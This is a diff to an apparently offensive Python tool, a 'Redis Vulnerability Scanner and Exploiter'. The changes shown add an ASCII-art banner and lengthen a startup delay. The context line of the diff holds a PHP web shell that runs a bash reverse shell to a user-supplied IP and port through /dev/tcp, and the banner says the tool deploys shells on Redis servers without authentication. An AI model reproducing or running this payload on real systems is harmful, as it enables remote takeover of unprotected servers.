@@ -54,11 +54,28 @@ set test "<?php exec(\\"/bin/bash -c 'bash -i > /dev/tcp/{user_ip}/{user_port} 0
         print(f"{Colors.RED}Invalid choice. Skipping shell initiation.{Colors.RESET}")
 
 def main():
+    art = """
+     ,---.   ,---.  ,---.  .-. .-.       
+ | .-.\  | .-'  | .-'  |  \| |       
+ | |-' \ | `-.  | `-.  |   | |       
+ | |--. \| .-'  | .-'  | |\  |       
+ | |`-' /|  `--.|  `--.| | |)|       
+ /( `--' /( __.'/( __.'/(  (_)       
+(__)    (__)   (__)   (__)           
+,---.    ,---.   ,'|"\   ,-.   .---. 
+| .-.\   | .-'   | |\ \  |(|  ( .-._)
+| `-'/   | `-.   | | \ \ (_) (_) \   
+|   (    | .-'   | |  \ \| | _  \ \  
+| |\ \   |  `--. /(|`-' /| |( `-'  ) 
+|_| \)\  /( __.'(__)`--' `-' `----'  
+    (__)(__)                         
+    """
+    print(art)
     print(f"{Colors.YELLOW}Redis Vulnerability Scanner and Exploiter by 'been'{Colors.RESET}")
     print(f"{Colors.GREEN}--------------------------------------------{Colors.RESET}")
     print(f"{Colors.GREEN}This tool checks for unauthenticated Redis access and allows shell deployment.{Colors.RESET}")
     print(f"{Colors.GREEN}--------------------------------------------{Colors.RESET}")
-    time.sleep(5)
+    time.sleep(6)
 
     parser = argparse.ArgumentParser(description="Check for unauthenticated Redis access.")
     parser.add_argument("--ip", help="Single IP address to check.")
